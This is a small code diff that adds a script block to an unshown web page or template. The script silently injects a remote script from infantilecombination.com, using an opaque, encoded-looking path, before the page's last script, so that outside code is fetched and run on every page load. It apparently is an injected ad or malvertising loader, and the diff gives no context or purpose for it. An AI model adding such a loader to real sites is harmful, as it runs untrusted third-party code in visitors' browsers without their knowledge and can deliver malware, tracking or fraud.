@@ -1,0 +1,11 @@
+<script>
+(function(vnlzdq){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = vnlzdq || {};
+s.src = "\/\/infantilecombination.com\/atW.5fw-YnWcdwlyQ\/2T9uk\/ZqTV9v6\/bu2\/5yleSPWKQl9vNxT\/Q\/xLNyTycm3gNICS0-1RNHD\/EI1LNnz-cC1U";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
